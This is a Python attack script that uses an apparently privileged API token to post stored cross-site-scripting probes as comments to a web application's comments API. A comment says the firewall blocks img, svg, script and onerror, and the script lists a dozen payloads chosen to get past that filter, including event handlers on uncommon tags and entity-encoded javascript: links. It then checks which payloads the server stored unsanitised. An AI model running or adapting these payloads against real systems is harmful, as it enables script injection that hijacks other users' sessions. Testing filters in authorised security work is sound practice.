import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(msg_html,msg_raw=None):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,
                     "message_raw":msg_raw if msg_raw is not None else msg_html,
                     "message_html":msg_html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXA'+uuid.uuid4().hex[:5]
# WAF blocks img/svg/script/onerror. Try tags+handlers it may allow.
probes=[
 ('b-onclick',   f'<b onclick="alert(1)">{tag}</b>'),
 ('i-onmouseover',f'<i onmouseover="alert(1)">{tag}</i>'),
 ('u-onfocus',   f'<u onfocus="alert(1)" tabindex=0>{tag}</u>'),
 ('a-href-c',    f'<a href="javascript&colon;alert(1)">{tag}</a>'),
 ('a-href-ent',  f'<a href="&#106;avascript:alert(1)">{tag}</a>'),
 ('details',     f'<details open ontoggle="alert(1)">{tag}</details>'),
 ('marquee',     f'<marquee onstart="alert(1)">{tag}</marquee>'),
 ('video',       f'<video><source onerror="alert(1)"></video>{tag}'),
 ('input-focus', f'<input autofocus onfocus="alert(1)">{tag}'),
 ('select',      f'<select autofocus onfocus="alert(1)">{tag}</select>'),
 ('textarea',    f'<textarea autofocus onfocus="alert(1)">{tag}</textarea>'),
 ('body-onload', f'<body onload="alert(1)">{tag}</body>'),
]
print(f"{'probe':16} {'POST':>5}  stored html")
for label,h in probes:
    c,b=post(h)
    stored=''
    if c in ('200','201'):
        try: stored=repr(json.loads(b)['comments'][0].get('message_html'))[:80]
        except: pass
    print(f"  {label:16} {c:>5}  {stored}")
